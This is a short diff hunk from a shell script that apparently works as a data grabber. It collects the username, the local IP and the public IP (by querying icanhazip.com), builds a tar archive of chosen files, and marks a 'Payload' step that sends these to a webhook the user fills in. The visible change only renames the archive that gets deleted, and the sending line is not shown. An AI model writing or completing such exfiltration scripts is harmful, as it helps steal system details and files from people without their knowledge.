@@ -3,7 +3,7 @@ VAR1=$(whoami)
 VAR2=$(hostname -I | awk '{print $1}')
 VAR3=$(curl icanhazip.com)
 ### Remove last arhive
-rm -rf data.tar.zip
+rm -rf data.tar
 ### Add Files to archive
 tar -rvf data.tar %file1% %file2% %file3%
 ### Payload with $VAR1-2-3 and Files.tar (CHANGES %WEBHOOK_URL% TO YOUR WEBHOOK API)
